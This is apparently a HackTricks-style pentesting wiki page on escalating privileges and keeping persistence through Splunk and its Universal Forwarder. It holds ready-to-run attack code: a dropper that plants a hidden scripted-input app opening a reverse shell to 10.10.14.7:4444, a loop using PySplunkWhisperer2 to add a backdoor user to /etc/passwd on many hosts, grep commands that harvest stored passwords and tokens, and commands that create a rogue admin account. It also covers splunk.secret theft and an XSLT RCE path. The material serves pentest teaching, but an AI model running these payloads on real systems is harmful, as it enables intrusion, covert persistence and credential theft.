# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

If **enumerating** a machine **internally** or **externally** you find **Splunk running** (usually **8000** for the web UI and **8089** for the management API), valid credentials can often be turned into **code execution** through app installation, scripted inputs, or management actions. If Splunk is running as **root**, that frequently becomes an immediate **privilege escalation**.

If you only need the generic remote attack surface, enumeration, or app-upload RCE path, check:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

If you are **already root** and the Splunk service is not listening only on localhost, you can also steal **Splunk password hashes**, recover **encrypted secrets**, or push a **malicious app** to keep persistence locally or across multiple forwarders.

## Interesting Local Files

When you land on a host running Splunk or Splunk Universal Forwarder, these are usually the most interesting paths:

```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```

Important artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users and password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key used by Splunk to encrypt secrets stored in several `.conf` files.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initial admin bootstrap file; useful in gold images and provisioning mistakes. It is ignored if `etc/passwd` already exists.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: where scripted inputs are commonly enabled.
- **`$SPLUNK_HOME/etc/deployment-apps/`** or **`$SPLUNK_HOME/etc/apps/`**: good places to hide a persistent app or review what is already being distributed.

## Splunk Universal Forwarder Agent Exploit Summary

For further details check [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a summary:

**Exploit overview:**
An exploit targeting the Splunk Universal Forwarder (UF) allows attackers with the **agent password** to execute arbitrary code on systems running the agent, potentially compromising a large portion of the environment.

**Why it works:**

- The UF management service is commonly exposed on **TCP 8089**.
- Attackers can authenticate to the API and instruct the forwarder to install a **malicious app bundle**.
- The same primitive can be used locally for **LPE** or remotely for **RCE**.
- Public tooling such as **SplunkWhisperer2** creates the app bundle automatically and can adapt payloads for Linux targets.

**Common ways to recover the password:**

- Cleartext credentials in documentation, scripts, shares, or deployment automation.
- Password hashes inside `$SPLUNK_HOME/etc/passwd` followed by offline cracking.
- Golden images or provisioning leftovers such as `user-seed.conf`.

**Impact:**

- SYSTEM/root-level code execution on each compromised host.
- Deployment of persistent apps, backdoors, or ransomware.
- Disabling or tampering with telemetry before the data is forwarded.

**Example command for exploitation:**

```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```

**Usable public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

If you have **filesystem write access** as `root`/`splunk`, or authenticated access to install apps, a very reliable persistence mechanism is to drop a **custom app** with a **scripted input**. Splunk's own documentation expects scripted inputs to live under an app directory and be enabled from `inputs.conf`.

Typical layout:

```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```

Minimal `inputs.conf`:

```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```

Quick Linux dropper:

```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```

Notes:

- The same trick works on **Universal Forwarder** using `/opt/splunkforwarder/etc/apps/`.
- Attackers often blend in by modifying a legitimate add-on instead of creating an obviously malicious app.
- On a **deployment server**, planting a malicious app inside `deployment-apps/` turns into **fleet-wide persistence** because forwarders poll, download updated apps, and often restart to apply them.

## Credential Theft and Admin Takeover

If you can read Splunk's local files, there are usually two good goals: recover **Splunk admin access** and recover **encrypted service credentials**.

### Password hashes and local users

Splunk stores local authentication data in `etc/passwd`. Depending on the deployment, cracking that file can recover working credentials for the web UI and the management API.

If you already have valid **admin** credentials and Splunk uses its **native** authentication backend, the CLI itself can be used for persistence:

```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```

### `splunk.secret` and encrypted values

Splunk uses `etc/auth/splunk.secret` to protect sensitive values stored in multiple configuration files. If you can steal both the **secret** and the relevant **`.conf` files**, you can often recover or replay:

- forwarder/indexer shared secrets such as `pass4SymmKey`
- TLS private-key passwords such as `sslPassword`
- LDAP bind credentials such as `bindDNPassword`

This is useful for **lateral movement** even when the Splunk admin password itself is not crackable.

### `user-seed.conf` abuse

`user-seed.conf` is only consumed during first start or when `etc/passwd` does not exist. That makes it less useful on a live box, but very interesting in:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances where Splunk is reinitialized automatically

In those cases, planting a `HASHED_PASSWORD` generated with `splunk hash-passwd` gives you a quiet way to regain admin access after redeployment.

## Abusing Splunk Queries

For further details check [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

A useful recent technique is abusing **user-supplied XSLT** in vulnerable Splunk Enterprise versions to turn a low-privileged authenticated account into **OS command execution** as the `splunk` user.

High-level flow:

1. Authenticate to Splunk.
2. Upload a malicious **XSL** file through the preview/upload functionality.
3. Make Splunk render search results with that uploaded stylesheet from the **dispatch** directory.
4. Use the XSLT payload to write a file or trigger execution through Splunk's search pipeline (for example by reaching internal functionality such as `runshellscript`).

The important offensive takeaway is that this path is **post-auth RCE without needing app upload**. On Linux it usually lands you in the **`splunk`** account, which is still valuable because that user often owns the application tree, can read secrets, and can plant persistent apps that survive shell loss.

A representative path used during exploitation is:

```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```

If Splunk is running with too many privileges, or if the `splunk` user has access to dangerous scripts, writable service units, or bad `sudo` rules, this becomes a clean **LPE** chain.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
